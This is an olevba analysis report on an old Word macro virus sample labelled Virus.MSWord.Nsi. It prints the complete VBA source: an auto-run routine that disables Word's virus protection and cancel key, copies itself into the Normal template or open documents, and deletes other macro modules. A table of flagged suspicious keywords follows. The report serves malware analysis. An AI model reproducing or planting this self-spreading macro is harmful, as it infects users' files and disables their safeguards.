olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Nsi-1086fb6984fbf03dceaec07e3a710251ce329ccd
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Nsi-1086fb6984fbf03dceaec07e3a710251ce329ccd - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub ComboBox1Open()

End Sub

Private Sub Document_Open()
    On Error Resume Next
    Options.VirusProtection = False
    EnableCancelKey = wdCancelDisabled
    Set maci = MacroContainer.VBProject.VBComponents.Item(1)
    Set macic = maci.codemodule
    ns$ = Left(macic.lines(1, 1), 21)
    Set inf = NormalTemplate: nsi$ = ns$ + "Close()"
        If MacroContainer = inf Then Set inf = ActiveDocument: nsi$ = ns$ + "Open()"
    Set infc = inf.VBProject.VBComponents
    Set infi = infc.Item(1)
    Set infic = infi.codemodule
    infi.Name = "ThisDocument"
    For mx = 2 To infc.Count
        infc.Remove infc.Item(2)
    Next mx
        If infic.countlines <> macic.countoflines Then
            infic.deletelines 1, infic.countoflines
            For coco = 1 To macic.countoflines
                infic.insertlines coco, macic.lines(coco, 1)
            Next coco
            infic.replaceline 1, nsi$
        End If
    If Left(ActiveDocument.Name, 8) <> Mid$(macic.lines(1, 1), 13, 8) Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
    EnableCancelKey = wdCancelDisabled
End Sub
'ThisDocument v 1.0 1999

Private Sub TextBox1_Change()

End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|AutoExec  |TextBox1_Change     |Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+
